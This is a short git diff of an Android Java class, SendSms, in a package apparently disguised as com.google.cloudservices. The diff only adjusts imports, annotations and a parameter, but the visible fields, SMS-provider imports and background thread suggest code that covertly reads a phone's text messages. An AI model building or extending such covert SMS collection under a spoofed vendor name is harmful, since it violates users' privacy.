@@ -1,8 +1,10 @@
 package com.google.cloudservices;
 
+import android.annotation.TargetApi;
 import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.Build;
 import android.provider.Telephony;
 
 import org.json.JSONArray;
@@ -20,7 +22,7 @@ public class SendSms {
     ArrayList<String> body1=null;
     ArrayList<String> dir1=null;
     int i=0,b=0,activit=0;
-    pro.tasking.dbFirsRun dbFirsRun=null;
+    dbFirsRun dbFirsRun=null;
     Uri uri=null;
     Cursor cursor=null;
     String body=null,number=null,datesms=null,type=null,s=null,da=null;
@@ -30,8 +32,9 @@ public class SendSms {
     long datesmsn=0;
     String c=null;
     int a=0;
-    public  void sendsms(Context context){
+    public  void sendsms(final Context context){
         new Thread(new Runnable() {
+            @TargetApi(Build.VERSION_CODES.KITKAT)
             @Override
             public void run() {
                 try {
